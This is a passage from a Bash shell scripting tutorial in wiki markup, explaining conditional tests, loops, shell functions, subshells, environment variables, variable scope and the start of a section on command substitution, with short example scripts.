&lt;source lang=&quot;bash&quot;&gt;#!/bin/bash

if ! [[ -e destination.txt ]] ; then
  cp source.txt destination.txt
fi&lt;/source&gt;

===Conditional expressions===

In addition to the &lt;tt&gt;-e ''file''&lt;/tt&gt; condition used above, which is true if &lt;tt&gt;''file''&lt;/tt&gt; exists, there are quite a few kinds of conditions supported by Bash's &lt;tt&gt;[[&lt;nowiki/&gt; … ]]&lt;/tt&gt; notation. Five of the most commonly used are:

; &lt;tt&gt;-d ''file''&lt;/tt&gt; : True if &lt;tt&gt;''file''&lt;/tt&gt; exists and is a directory.
; &lt;tt&gt;-f ''file''&lt;/tt&gt; : True if &lt;tt&gt;''file''&lt;/tt&gt; exists and is a regular file.
; &lt;tt&gt;''string1'' = ''string2''&lt;/tt&gt; : True if &lt;tt&gt;''string1''&lt;/tt&gt; and &lt;tt&gt;''string2''&lt;/tt&gt; are equal.
; &lt;tt&gt;''string'' == ''pattern''&lt;/tt&gt; : True if &lt;tt&gt;''string''&lt;/tt&gt; matches &lt;tt&gt;''pattern''&lt;/tt&gt;. (&lt;tt&gt;''pattern''&lt;/tt&gt; has the same form as a pattern in filename expansion; for example, unquoted &lt;tt&gt;*&lt;/tt&gt; means &quot;zero or more characters&quot;.)
; &lt;tt&gt;''string'' != ''pattern''&lt;/tt&gt; : True if &lt;tt&gt;''string''&lt;/tt&gt; does ''not'' match &lt;tt&gt;''pattern''&lt;/tt&gt;.

In the last three types of tests, the value on the left is usually a variable expansion; for example, &lt;tt&gt;[[&lt;nowiki/&gt; &quot;$var&quot; = 'value' ]]&lt;/tt&gt; returns a successful exit status if the variable named &lt;tt&gt;var&lt;/tt&gt; contains the value &lt;tt&gt;value&lt;/tt&gt;.

The above conditions just scratch the surface; there are many more conditions that examine files, a few more conditions that examine strings, several conditions for examining integer values, and a few other conditions that don't belong to any of these groups.

One common use for equality tests is to see if the first argument to a script (&lt;tt&gt;$1&lt;/tt&gt;) is a special option. For example, consider our &lt;tt&gt;if&lt;/tt&gt; statement above that tries to copy &lt;tt&gt;source1.txt&lt;/tt&gt; or &lt;tt&gt;source2.txt&lt;/tt&gt; to &lt;tt&gt;destination.txt&lt;/tt&gt;. The above version is very &quot;verbose&quot;: it generates a lot of output. Usually we don't want a script to generate quite so much output; but we may want users to be able to request the output, for example by passing in &lt;tt&gt;--verbose&lt;/tt&gt; as the first argument. The following script is equivalent to the above &lt;tt&gt;if&lt;/tt&gt; statements, but it only prints output if the first argument is &lt;tt&gt;--verbose&lt;/tt&gt;:

&lt;source lang=&quot;bash&quot;&gt;#!/bin/bash

if [[ &quot;$1&quot; == --verbose ]] ; then
  verbose_mode=TRUE
  shift # remove the option from $@
else
  verbose_mode=FALSE
fi

if [[ -e source1.txt ]] ; then
  if [[ &quot;$verbose_mode&quot; == TRUE ]] ; then
    echo 'source1.txt exists; copying to destination.txt.'
  fi
  cp source1.txt destination.txt
elif [[ -e source2.txt ]] ; then
  if [[ &quot;$verbose_mode&quot; == TRUE ]] ; then
    echo 'source1.txt does not exist, but source2.txt does.'
    echo 'Copying source2.txt to destination.txt.'
  fi
  cp source2.txt destination.txt
else
  if [[ &quot;$verbose_mode&quot; == TRUE ]] ; then
    echo 'Neither source1.txt nor source2.txt exists; exiting.'
  fi
  exit 1 # terminate the script with a nonzero exit status (failure)
fi&lt;/source&gt;

Later, when we learn about shell functions, we will find a more compact way to express this. (In fact, even with what we already know, there is a more compact way to express this: rather than setting &lt;tt&gt;$verbose_mode&lt;/tt&gt; to &lt;tt&gt;TRUE&lt;/tt&gt; or &lt;tt&gt;FALSE&lt;/tt&gt;, we can set &lt;tt&gt;$echo_if_verbose_mode&lt;/tt&gt; to &lt;tt&gt;echo&lt;/tt&gt; or &lt;tt&gt;:&lt;/tt&gt;, where the colon &lt;tt&gt;:&lt;/tt&gt; is a Bash built-in command that does nothing. We can then replace all uses of &lt;tt&gt;echo&lt;/tt&gt; with &lt;tt&gt;&quot;$echo_if_verbose_mode&quot;&lt;/tt&gt;. A command such as &lt;tt&gt;&quot;$echo_if_verbose_mode&quot; ''message''&lt;/tt&gt; would then become &lt;tt&gt;echo ''message''&lt;/tt&gt;, printing &lt;tt&gt;''message''&lt;/tt&gt;, if verbose-mode is turned on, but would become &lt;tt&gt;: ''message''&lt;/tt&gt;, doing nothing, if verbose-mode is turned off. However, that approach might be more confusing than is really worthwhile for such a simple purpose.)

===Combining conditions===

To combine multiple conditions with &quot;and&quot; or &quot;or&quot;, or to invert a condition with &quot;not&quot;, we can use the general Bash notations we've already seen. Consider this example:

&lt;source lang=&quot;bash&quot;&gt;#!/bin/bash

if [[ -e source.txt ]] &amp;&amp; ! [[ -e destination.txt ]] ; then
  # source.txt exists, destination.txt does not exist; perform the copy:
  cp source.txt destination.txt
fi&lt;/source&gt;

The test-command &lt;source lang=&quot;bash&quot; enclose=&quot;none&quot;&gt;[[ -e source.txt ]] &amp;&amp; ! [[ -e destination.txt ]]&lt;/source&gt; uses the &lt;tt&gt;&amp;&amp;&lt;/tt&gt; and &lt;tt&gt;!&lt;/tt&gt; operators that we saw above that work based on exit status. &lt;tt&gt;[[&lt;nowiki/&gt; ''condition'' ]]&lt;/tt&gt; is &quot;successful&quot; if &lt;tt&gt;''condition''&lt;/tt&gt; is true, which means that &lt;source lang=&quot;bash&quot; enclose=&quot;none&quot;&gt;[[ -e source.txt ]] &amp;&amp; ! [[ -e destination.txt ]]&lt;/source&gt; will only run &lt;source lang=&quot;bash&quot; enclose=&quot;none&quot;&gt;! [[ -e destination.txt ]]&lt;/source&gt; if &lt;tt&gt;source.txt&lt;/tt&gt; exists. Furthermore, &lt;tt&gt;!&lt;/tt&gt; inverts the exit status of &lt;source lang=&quot;bash&quot; enclose=&quot;none&quot;&gt;[[ -e destination.txt ]]&lt;/source&gt;, so that &lt;source lang=&quot;bash&quot; enclose=&quot;none&quot;&gt;! [[ -e destination.txt ]]&lt;/source&gt; is &quot;successful&quot; if and only if &lt;tt&gt;destination.txt&lt;/tt&gt; ''doesn't'' exist. The end result is that &lt;source lang=&quot;bash&quot; enclose=&quot;none&quot;&gt;[[ -e source.txt ]] &amp;&amp; ! [[ -e destination.txt ]]&lt;/source&gt; is &quot;successful&quot; — &quot;true&quot; — if and only if &lt;tt&gt;source.txt&lt;/tt&gt; ''does'' exist and &lt;tt&gt;destination.txt&lt;/tt&gt; does ''not'' exist.

The construction &lt;source lang=&quot;bash&quot; enclose=&quot;none&quot;&gt;[[ … ]]&lt;/source&gt; actually has built-in internal support for these operators, such that we can also write the above this way:

&lt;source lang=&quot;bash&quot;&gt;#!/bin/bash

if [[ -e source.txt &amp;&amp; ! -e destination.txt ]] ; then
  # source.txt exists, destination.txt does not exist; perform the copy:
  cp source.txt destination.txt
fi&lt;/source&gt;

but the general-purpose notations are often more clear; and of course, they can be used with any test-command, not just the &lt;source lang=&quot;bash&quot; enclose=&quot;none&quot;&gt;[[ … ]]&lt;/source&gt; construction.

===Notes on readability===

The &lt;tt&gt;if&lt;/tt&gt; statements in the above examples are formatted to make them easy for humans to read and understand. This is important, not only for examples in a book, but also for scripts in the real world. Specifically, the above examples follow these conventions:

* The commands within an &lt;tt&gt;if&lt;/tt&gt; statement are indented by a consistent amount (by two spaces, as it happens). This indentation is irrelevant to Bash — it ignores whitespace at the beginning of a line — but is very important to human programmers. Without it, it is hard to see where an &lt;tt&gt;if&lt;/tt&gt; statement begins and ends, or even to see that there is an &lt;tt&gt;if&lt;/tt&gt; statement. Consistent indentation becomes even more important when there are &lt;tt&gt;if&lt;/tt&gt; statements nested within &lt;tt&gt;if&lt;/tt&gt; statements (or other control structures, of various kinds that we will see).
* The semicolon character &lt;tt&gt;;&lt;/tt&gt; is used before &lt;tt&gt;then&lt;/tt&gt;. This is a special operator for separating commands; it is mostly equivalent to a line-break, though there are some differences (for example, a comment always runs from &lt;tt&gt;#&lt;/tt&gt; to the end of a line, never from &lt;tt&gt;#&lt;/tt&gt; to &lt;tt&gt;;&lt;/tt&gt;). We could write &lt;tt&gt;then&lt;/tt&gt; at the beginning of a new line, and that is perfectly fine, but it's good for a single script to be consistent one way or the other; using a single, consistent appearance for ordinary constructs makes it easier to notice unusual constructs. In the real world, programmers usually put &lt;tt&gt;; then&lt;/tt&gt; at the end of the &lt;tt&gt;if&lt;/tt&gt; or &lt;tt&gt;elif&lt;/tt&gt; line, so we have followed that convention here.
* A newline is used after &lt;tt&gt;then&lt;/tt&gt; and after &lt;tt&gt;else&lt;/tt&gt;. These newlines are optional — they need not be (and cannot be) replaced with semicolons — but they promote readability by visually accentuating the structure of the &lt;tt&gt;if&lt;/tt&gt; statement.
* Regular commands are separated by newlines, never semicolons. This is a general convention, not specific to &lt;tt&gt;if&lt;/tt&gt; statements. Putting each command on its own line makes it easier for someone to &quot;skim&quot; the script and see roughly what it is doing.

These exact conventions are not particularly important, but it is good to follow consistent and readable conventions for formatting your code. When a fellow programmer looks at your code — or when you look at your code two months after writing it — inconsistent or illogical formatting can make it very difficult to understand what is going on.

==Loops==

Often we want to run the same sequence of commands, over and over again, with slight differences. For example, suppose that we want to take all files named &lt;tt&gt;*.txt&lt;/tt&gt; and rename them to &lt;tt&gt;*.txt.bak&lt;/tt&gt; (&quot;backup&quot;). We can use file-expansion to get the list of files named &lt;tt&gt;*.txt&lt;/tt&gt;, but how do we use that list? There's no obvious command containing, say, &lt;tt&gt;'foo.txt' 'bar.txt' 'baz.txt'&lt;/tt&gt;, that would perform the three moves we need. What we need is a &lt;tt&gt;for&lt;/tt&gt; loop:

&lt;source lang=&quot;bash&quot;&gt;for file in *.txt ; do
  mv &quot;$file&quot; &quot;$file.bak&quot;
done&lt;/source&gt;

The above takes the variable &lt;tt&gt;file&lt;/tt&gt;, and assigns it in turn to each word in the expansion of &lt;tt&gt;*.txt&lt;/tt&gt;. Each time, it runs the body of the loop. In other words, it is equivalent to the following:

&lt;source lang=&quot;bash&quot;&gt;file='foo.txt'
mv &quot;$file&quot; &quot;$file.bak&quot;
file='bar.txt'
mv &quot;$file&quot; &quot;$file.bak&quot;
file='baz.txt'
mv &quot;$file&quot; &quot;$file.bak&quot;&lt;/source&gt;

There is nothing special here about filename expansion; we can use the same approach to iterate over any other argument-list, such as the integers 1 through 20 (using brace expansion):

&lt;source lang=&quot;bash&quot;&gt;for i in {1..20} ; do
  echo &quot;$i&quot;
done&lt;/source&gt;

or the positional parameters &lt;tt&gt;&quot;$@&quot;&lt;/tt&gt;:

&lt;source lang=&quot;bash&quot;&gt;for arg in &quot;$@&quot; ; do
  echo &quot;$arg&quot;
done&lt;/source&gt;

In fact, that specific case is so common that Bash provides the equivalent shorthand &lt;source lang=&quot;bash&quot; enclose=&quot;none&quot;&gt;for arg ; do&lt;/source&gt;, with &lt;source lang=&quot;bash&quot; enclose=&quot;none&quot;&gt;in &quot;$@&quot;&lt;/source&gt; being implied. (But it's probably better to use the explicit form anyway.)

Another kind of loop is the &lt;tt&gt;while&lt;/tt&gt; loop. It is similar to an &lt;tt&gt;if&lt;/tt&gt; statement, except that it loops repeatedly as long as its test-command continues to be successful. For example, suppose that we need to wait until the file &lt;tt&gt;wait.txt&lt;/tt&gt; is deleted. One approach is to &quot;sleep&quot; for a few seconds, then &quot;wake up&quot; and see if it still exists. We can loop repeatedly in this fashion:

&lt;source lang=&quot;bash&quot;&gt;while [[ -e wait.txt ]] ; do
  sleep 3 # &quot;sleep&quot; for three seconds
done&lt;/source&gt;

Conversely, we can use an &lt;tt&gt;until&lt;/tt&gt; loop to loop ''until'' a given command is successful; for example, the reverse of the above might be:

&lt;source lang=&quot;bash&quot;&gt;until [[ -e proceed.txt ]] ; do
  sleep 3 # &quot;sleep&quot; for three seconds
done&lt;/source&gt;

Of course, this is the same as combining &lt;tt&gt;while&lt;/tt&gt; with &lt;tt&gt;!&lt;/tt&gt;, but in some cases it may be more readable.

==Shell functions==

A ''shell function'' is a special type of variable that is essentially a script-within-a-script. This feature allows us to group a sequence of commands into a single named command, which is particularly useful if the sequence of commands needs to be run from many places within the script. A shell function can even consist of just a single command; this may be useful if the command is particularly complicated, or if its significance would not immediately be obvious to a reader. (That is, shell functions can serve two purposes: they can save typing, and they can allow for more readable code by creating intuitively-named commands.) Consider the following script:

&lt;source lang=&quot;bash&quot;&gt;#!/bin/bash

function get_password ( )
# Usage:     get_password VARNAME
# Asks the user for a password; saves it as $VARNAME.
# Returns a non-zero exit status if standard input is not a terminal, or if the
# &quot;read&quot; command returns a non-zero exit status.
{
  if [[ -t 0 ]] ; then
    read -r -p 'Password:' -s &quot;$1&quot; &amp;&amp; echo
  else
    return 1
  fi
}

get_password PASSWORD &amp;&amp; echo &quot;$PASSWORD&quot;
&lt;/source&gt;

The above script creates a shell function called &lt;tt&gt;get_password&lt;/tt&gt; that asks the user to type a password, and stores the result in a specified variable. It then runs &lt;tt&gt;get_password PASSWORD&lt;/tt&gt; to store the password as &lt;tt&gt;$PASSWORD&lt;/tt&gt;; and lastly, if the call to &lt;tt&gt;get_password&lt;/tt&gt; succeeded (as determined by its exit status), the retrieved password is printed to standard output (which is obviously not a realistic use; the goal here is simply to demonstrate the behavior of &lt;tt&gt;get_password&lt;/tt&gt;).

The function &lt;tt&gt;get_password&lt;/tt&gt; doesn't do anything that couldn't be done without a shell function, but the result is much more readable. The function invokes the built-in command &lt;tt&gt;read&lt;/tt&gt; (which reads a line of user input and saves it in one or more variables) with several options that most Bash programmers will not be familiar with. (The &lt;tt&gt;-r&lt;/tt&gt; option disables a special meaning for the backslash character; the &lt;tt&gt;-p&lt;/tt&gt; option causes a specified prompt, in this case &lt;tt&gt;Password:&lt;/tt&gt;, to be displayed at the head of the line; and the &lt;tt&gt;-s&lt;/tt&gt; option prevents the password from being displayed as the user types it in. Since the &lt;tt&gt;-s&lt;/tt&gt; option also prevents the user's newline from being displayed, the &lt;tt&gt;echo&lt;/tt&gt; command supplies a newline.) Additionally, the function uses the conditional expression &lt;tt&gt;-t 0&lt;/tt&gt; to make sure that the script's input is coming from a terminal (a console), and not from a file or from another program that wouldn't know that a password is being requested. (This last feature is debatable; depending on the general functionality of the script, it may be better to accept a password from standard input regardless of its source, under the assumption that the source was designed with the script in mind.) The overall point is that giving sequence of commands a name — &lt;tt&gt;get_password&lt;/tt&gt; — makes it much easier for a programmer to know what it does.

Within a shell function, the positional parameters (&lt;tt&gt;$1&lt;/tt&gt;, &lt;tt&gt;$2&lt;/tt&gt;, and so on, as well as &lt;tt&gt;$@&lt;/tt&gt;, &lt;tt&gt;$*&lt;/tt&gt;, and &lt;tt&gt;$#&lt;/tt&gt;) refer to the arguments that the function was called with, ''not'' the arguments of the script that contains the function. If the latter are needed, then they need to be passed in explicitly to the function, using &lt;tt&gt;&quot;$@&quot;&lt;/tt&gt;. (Even then, &lt;tt&gt;shift&lt;/tt&gt; and &lt;tt&gt;set&lt;/tt&gt; will only affect the positional parameters within the function, not those of the caller.)

A function call returns an exit status, just like a script (or almost any command). To explicitly specify an exit status, use the &lt;tt&gt;return&lt;/tt&gt; command, which terminates the function call and returns the specified exit status. (The &lt;tt&gt;exit&lt;/tt&gt; command cannot be used for this, because it would terminate the entire script, just as if it were called from outside a function.) If no exit status is specified, either because no argument is given to the &lt;tt&gt;return&lt;/tt&gt; command or because the end of the function is reached without having run a &lt;tt&gt;return&lt;/tt&gt; command, then the function returns the exit status of the last command that was run.

Incidentally, either &lt;tt&gt;function&lt;/tt&gt; or &lt;tt&gt;( )&lt;/tt&gt; may be omitted from a function declaration, but at least one must be present. Instead of &lt;source lang=&quot;bash&quot; enclose=&quot;none&quot;&gt;function get_password ( )&lt;/source&gt;, many programmers write &lt;source lang=&quot;bash&quot; enclose=&quot;none&quot;&gt;get_password()&lt;/source&gt;. Similarly, the &lt;tt&gt;{ &amp;hellip; }&lt;/tt&gt; notation is not exactly required, and is not specific to functions; it is simply a notation for grouping a sequence of commands into a single compound command. The body of a function must be a compound command, such as a &lt;tt&gt;{ &amp;hellip; }&lt;/tt&gt; block or an &lt;tt&gt;if&lt;/tt&gt; statement; &lt;tt&gt;{ &amp;hellip; }&lt;/tt&gt; is the conventional choice, even when all it contains is a single compound command and so could theoretically be dispensed with.

==Subshells, environment variables, and scope==

{{Bash Shell Scripting/caution|Take your time with this section. These concepts are relatively straightforward once you understand them, but they are different in important ways from analogous concepts in other programming languages. Many programmers and systems administrators, including some who are experienced in Bash, find them counter-intuitive at first.}}

===Subshells===

In Bash, one or more commands can be wrapped in parentheses, causing those commands to be executed in a &quot;subshell&quot;. (There are also a few ways that subshells can be created implicitly; we will see those later.) A subshell receives a copy of the surrounding context's &quot;execution environment&quot;, which includes any variables, among other things; but any changes that the subshell makes to the execution environment are ''not'' copied back when the subshell completes. So, for example, this script:

&lt;source lang=&quot;bash&quot;&gt;#!/bin/bash

foo=bar
echo &quot;$foo&quot; # prints 'bar'

# subshell:
(
  echo &quot;$foo&quot; # prints 'bar' - the subshell inherits its parents' variables
  baz=bip
  echo &quot;$baz&quot; # prints 'bip' - the subshell can create its own variables
  foo=foo
  echo &quot;$foo&quot; # prints 'foo' - the subshell can modify inherited variables
)

echo &quot;$baz&quot; # prints nothing (just a newline) - the subshell's new variables are lost
echo &quot;$foo&quot; # prints 'bar' - the subshell's changes to old variables are lost
&lt;/source&gt;

prints this: &lt;pre&gt;bar&amp;#xA;bar&amp;#xA;bip&amp;#xA;foo&amp;#xA;&amp;#xA;bar&lt;/pre&gt;

{{Bash Shell Scripting/tip|If you need to call a function that modifies one or more variables, but you don't actually want those variables to be modified, you can wrap the function call in parentheses, so it takes place in a subshell. This will &quot;isolate&quot; the modifications and prevent them from affecting the surrounding execution environment. (That said: when possible, it's better to write functions in such a way that this problem doesn't arise to begin with. As we'll see soon, the &lt;tt&gt;local&lt;/tt&gt; keyword can help with this.)}}

The same is true of function definitions; just like a regular variable, a function defined within a subshell is not visible outside the subshell.

A subshell also delimits changes to other aspects of the execution environment; in particular, the &lt;tt&gt;cd&lt;/tt&gt; (&quot;change directory&quot;) command only affects the subshell. So, for example, this script:

&lt;source lang=&quot;bash&quot;&gt;#!/bin/bash

cd /
pwd # prints '/'

# subshell:
(
  pwd # prints '/' - the subshell inherits the working directory
  cd home
  pwd # prints '/home' - the subshell can change the working directory
) # end of subshell

pwd # prints '/' - the subshell's changes to the working directory are lost
&lt;/source&gt;

prints this: &lt;pre&gt;/&amp;#xA;/&amp;#xA;/home&amp;#xA;/&lt;/pre&gt;

{{Bash Shell Scripting/tip|If your script needs to change the working directory before running a given command, it's a good idea to use a subshell if possible. Otherwise it can become hard to keep track of the working directory when reading a script. (Alternatively, the &lt;tt&gt;pushd&lt;/tt&gt; and &lt;tt&gt;popd&lt;/tt&gt; built-in commands can be used to similar effect.)}}

An &lt;tt&gt;exit&lt;/tt&gt; statement within a subshell terminates only that subshell. For example, this script:

&lt;source lang=&quot;bash&quot;&gt;#!/bin/bash
( exit 0 ) &amp;&amp; echo 'subshell succeeded'
( exit 1 ) || echo 'subshell failed'
&lt;/source&gt;

prints this: &lt;pre&gt;subshell succeeded&amp;#xA;subshell failed&lt;/pre&gt;

Like in a script as a whole, &lt;tt&gt;exit&lt;/tt&gt; defaults to returning the exit status of the last-run command, and a subshell that does not have an explicit &lt;tt&gt;exit&lt;/tt&gt; statement will return the exit status of the last-run command.

===Environment variables===

We have already seen that, when a program is called, it receives a list of arguments that are explicitly listed on the command line. What we haven't mentioned is that it also receives a list of name-value pairs called &quot;environment variables&quot;. Different programming languages offer different ways for a program to access an environment variable; C programs can use &lt;tt&gt;getenv(&quot;&lt;var&gt;variable_name&lt;/var&gt;&quot;)&lt;/tt&gt; (and/or accept them as a third argument to &lt;tt&gt;main&lt;/tt&gt;), Perl programs can use &lt;tt&gt;$ENV{'&lt;var&gt;variable_name&lt;/var&gt;'}&lt;/tt&gt;, Java programs can use &lt;tt&gt;System.getenv().get(&quot;&lt;var&gt;variable_name&lt;/var&gt;&quot;)&lt;/tt&gt;, and so forth.

In Bash, environment variables are simply made into regular Bash variables. So, for example, the following script prints out the value of the &lt;tt&gt;HOME&lt;/tt&gt; environment variable:

&lt;source lang=&quot;bash&quot;&gt;#!/bin/bash
echo &quot;$HOME&quot;&lt;/source&gt;

The reverse, however, is not true: regular Bash variables are not automatically made into environment variables. So, for example, this script:

&lt;source lang=&quot;bash&quot;&gt;#!/bin/bash
foo=bar
bash -c 'echo $foo'&lt;/source&gt;

will not print &lt;tt&gt;bar&lt;/tt&gt;, because the variable &lt;tt&gt;foo&lt;/tt&gt; is not passed into the &lt;tt&gt;bash&lt;/tt&gt; command as an environment variable. (&lt;tt&gt;bash -c &lt;var&gt;script&lt;/var&gt; &lt;var&gt;arguments&amp;hellip;&lt;/var&gt;&lt;/tt&gt; runs the one-line Bash script &lt;tt&gt;&lt;var&gt;script&lt;/var&gt;&lt;/tt&gt;.)

To turn a regular Bash variable into an environment variable, we have to &quot;export&quot; it into the environment. The following script ''does'' print &lt;tt&gt;bar&lt;/tt&gt;:

&lt;source lang=&quot;bash&quot;&gt;#!/bin/bash
export foo=bar
bash -c 'echo $foo'&lt;/source&gt;

Note that &lt;tt&gt;export&lt;/tt&gt; doesn't just create an environment variable; it actually marks the Bash variable as an exported variable, and later assignments to the Bash variable will affect the environment variable as well. That effect is illustrated by this script:

&lt;source lang=&quot;bash&quot;&gt;#!/bin/bash
foo=bar
bash -c 'echo $foo' # prints nothing
export foo
bash -c 'echo $foo' # prints 'bar'
foo=baz
bash -c 'echo $foo' # prints 'baz'
&lt;/source&gt;

The &lt;tt&gt;export&lt;/tt&gt; command can also be used to remove a variable from an environment, by including the &lt;tt&gt;-n&lt;/tt&gt; option; for example, &lt;source lang=&quot;bash&quot; enclose=&quot;none&quot;&gt;export -n foo&lt;/source&gt; undoes the effect of &lt;source lang=&quot;bash&quot; enclose=&quot;none&quot;&gt;export foo&lt;/source&gt;. And multiple variables can be exported or unexported in a single command, such as &lt;source lang=&quot;bash&quot; enclose=&quot;none&quot;&gt;export foo bar&lt;/source&gt; or &lt;source lang=&quot;bash&quot; enclose=&quot;none&quot;&gt;export -n foo bar&lt;/source&gt;.

It's important to note that environment variables are only ever passed ''into'' a command; they are never received ''back'' from a command. In this respect, they are similar to regular Bash variables and subshells. So, for example, this command:

&lt;source lang=&quot;bash&quot;&gt;#!/bin/bash
export foo=bar
bash -c 'foo=baz' # has no effect
echo &quot;$foo&quot; # print 'bar'
&lt;/source&gt;

prints &lt;tt&gt;bar&lt;/tt&gt;; the change to &lt;tt&gt;$foo&lt;/tt&gt; inside the one-line script doesn't affect the process that invoked it. (However, it ''would'' affect any scripts that were called in turn ''by'' that script.)

If a given environment variable is desired for just one command, the syntax &lt;source lang=&quot;bash&quot; enclose=&quot;none&quot;&gt;var=value command&lt;/source&gt; may be used, with the syntax of a variable assignment (or multiple variable assignments) preceding a command on the same line. (Note that, despite using the syntax of a variable assignment, this is very different from a normal Bash variable assignment, in that the variable is automatically exported into the environment, and in that it only exists for the one command. If you want avoid the confusion of similar syntax doing dissimilar things, you can use the common Unix utility &lt;tt&gt;env&lt;/tt&gt; for the same effect. That utility also makes it possible to ''remove'' an environment variable for one command — or even to remove ''all'' environment variables for one command.) If &lt;tt&gt;$var&lt;/tt&gt; already exists, and it's desired to include its actual value in the environment for just one command, that can be written as &lt;source lang=&quot;bash&quot; enclose=&quot;none&quot;&gt;var=&quot;$var&quot; command&lt;/source&gt;.

An aside: sometimes it's useful to put variable definitions — or function definitions — in one Bash script (say, &lt;tt&gt;header.sh&lt;/tt&gt;) that can be called by another Bash script (say, &lt;tt&gt;main.sh&lt;/tt&gt;). We can see that simply invoking that other Bash script, as &lt;tt&gt;./header.sh&lt;/tt&gt; or as &lt;tt&gt;bash ./header.sh&lt;/tt&gt;, will not work: the variable definitions in &lt;tt&gt;header.sh&lt;/tt&gt; would not be seen by &lt;tt&gt;main.sh&lt;/tt&gt;, not even if we &quot;exported&quot; those definitions. (This is a common point of confusion: &lt;tt&gt;export&lt;/tt&gt; exports variables into the environment so that other processes can see them, but they're still only seen by ''child'' processes, not by ''parents''.) However, we can use the Bash built-in command &lt;tt&gt;.&lt;/tt&gt; (&quot;dot&quot;) or &lt;tt&gt;source&lt;/tt&gt;, which runs an external file almost as though it were a shell function. If &lt;tt&gt;header.sh&lt;/tt&gt; looks like this:

&lt;source lang=&quot;bash&quot;&gt;foo=bar
function baz ()
{
  echo &quot;$@&quot;
}&lt;/source&gt;

then this script:

&lt;source lang=&quot;bash&quot;&gt;#!/bin/bash
. header.sh
baz &quot;$foo&quot;&lt;/source&gt;

will print &lt;tt&gt;'bar'&lt;/tt&gt;.

===Scope===

We have now seen some of the vagaries of variable scope in Bash. To summarize what we've seen so far:

* Regular Bash variables are scoped to the shell that contains them, including any subshells in that shell.
** They are not visible to any child processes (that is, to external programs).
** If they are created inside a subshell, they are not visible to the parent shell.
** If they are modified inside a subshell, those modifications are not visible to the parent shell.
** This is also true of functions, which in many ways are similar to regular Bash variables.
* Function-calls are not inherently run in subshells.
** A variable modification within a function ''is'' generally visible to the code that calls the function.
* Bash variables that are exported into the environment are scoped to the shell that contains them, including any subshells ''or child processes'' in that shell.
** The &lt;tt&gt;export&lt;/tt&gt; built-in command can be used to export a variable into the environment. (There are other ways as well, but this is the most common way.)
** They differ from non-exported variables only in that they are visible to child processes. In particular, they are still not visible to parent shells or parent processes.
* External Bash scripts, like other external programs, are run in child processes. The &lt;tt&gt;.&lt;/tt&gt; or &lt;tt&gt;source&lt;/tt&gt; built-in command can be used to run such a script internally, in which case it's not inherently run in a subshell.

To this we now add:

* Bash variables that are localized to a function-call are scoped to the function that contains them, including any functions called by that function.
** The &lt;tt&gt;local&lt;/tt&gt; built-in command can be used to localize one or more variables to a function-call, using the syntax &lt;source lang=&quot;bash&quot; enclose=&quot;none&quot;&gt;local var1 var2&lt;/source&gt; or &lt;source lang=&quot;bash&quot; enclose=&quot;none&quot;&gt;local var1=val1 var2=val2&lt;/source&gt;. (There are other ways as well — for example, the &lt;tt&gt;declare&lt;/tt&gt; built-in command has the same effect — but this is probably the most common way.)
** They differ from non-localized variables only in that they disappear when their function-call ends. In particular, they still ''are'' visible to subshells and child function-calls. Furthermore, like non-localized variables, they can be exported into the environment so as to be seen by child processes as well.

In effect, using &lt;tt&gt;local&lt;/tt&gt; to localize a variable to a function-call is like putting the function-call in a subshell, except that it only affects the one variable; other variables can still be left non-&quot;local&quot;.

{{Bash Shell Scripting/tip|A variable that is set inside a function (either via assignment, or via a for-loop or other built-in command) should be marked as &quot;local&quot; using the built-in command &lt;tt&gt;local&lt;/tt&gt;, so as to avoid accidentally affecting code outside the function, unless it is specifically desired that the caller see the new value.}}

It's important to note that, although local variables in Bash are very useful, they are not quite ''as'' local as local variables in most other programming languages, in that they're seen by child function-calls. For example, this script:

&lt;source lang=&quot;bash&quot;&gt;#!/bin/bash

foo=bar

function f1 ()
{
  echo &quot;$foo&quot;
}

function f2 ()
{
  local foo=baz
  f1 # prints 'baz'
}

f2&lt;/source&gt;

will actually print &lt;tt&gt;baz&lt;/tt&gt; rather than &lt;tt&gt;bar&lt;/tt&gt;. This is because the original value of &lt;tt&gt;$foo&lt;/tt&gt; is hidden until &lt;tt&gt;f2&lt;/tt&gt; returns. (In programming language theory, a variable like &lt;tt&gt;$foo&lt;/tt&gt; is said to be &quot;dynamically scoped&quot; rather than &quot;lexically scoped&quot;.)

One difference between &lt;tt&gt;local&lt;/tt&gt; and a subshell is that whereas a subshell initially takes its variables from its parent shell, a statement like &lt;tt&gt;local foo&lt;/tt&gt; immediately hides the previous value of &lt;tt&gt;$foo&lt;/tt&gt;; that is, &lt;tt&gt;$foo&lt;/tt&gt; becomes locally unset. If it is desired to initialize the local &lt;tt&gt;$foo&lt;/tt&gt; to the value of the existing &lt;tt&gt;$foo&lt;/tt&gt;, we must explicitly specify that, by using a statement like &lt;tt&gt;local foo=&quot;$foo&quot;&lt;/tt&gt;.

When a function exits, variables regain the values they had before their &lt;tt&gt;local&lt;/tt&gt; declarations (or they simply become unset, if they had previously been unset). Interestingly, this means that a script such as this one:

&lt;source lang=&quot;bash&quot;&gt;#!/bin/bash

function f ()
{
  foo=baz
  local foo=bip
}

foo=bar
f
echo &quot;$foo&quot;&lt;/source&gt;

will actually print &lt;tt&gt;baz&lt;/tt&gt;: the &lt;tt&gt;foo=baz&lt;/tt&gt; statement in the function takes effect before the variable is localized, so the value &lt;tt&gt;baz&lt;/tt&gt; is what is restored when the function returns.

And since &lt;tt&gt;local&lt;/tt&gt; is simply an executable command, a function can decide at execution-time whether to localize a given variable, so this script:

&lt;source lang=&quot;bash&quot;&gt;#!/bin/bash

function f ()
{
  if [[ &quot;$1&quot; == 'yes' ]] ; then
    local foo
  fi
  foo=baz
}

foo=bar
f yes # modifies a localized $foo, so has no effect
echo &quot;$foo&quot; # prints 'bar'
f # modifies the non-localized $foo, setting it to 'baz'
echo &quot;$foo&quot; # prints 'baz'&lt;/source&gt;

will actually print &lt;pre&gt;bar&amp;#xA;baz&lt;/pre&gt;

==Pipelines and command substitution==

As we have seen, a command's return value, taken strictly, is just a small non-negative integer intended to indicate success or failure. Its real output is what it writes to the standard output stream. By default, text written to the standard output stream is printed to the terminal, but there are a few ways that it can be &quot;captured&quot; and used as the command's true return value.

===Pipelines===

When a sequence of commands are linked together in a pipeline, the output of each command is passed as input to the next. This is a very powerful technique, since it lets us combine a number of small utility programs to create something complex.

===Command substitution===

Command substitution is a bit like variable expansion, but it runs a command and captures its output, rather than simply retrieving the value of a variable. For example, consider our &lt;tt&gt;get_password&lt;/tt&gt; example above:

&lt;source lang=&quot;bash&quot;&gt;#!/bin/bash
 
function get_password ( )
# Usage:     get_password VARNAME
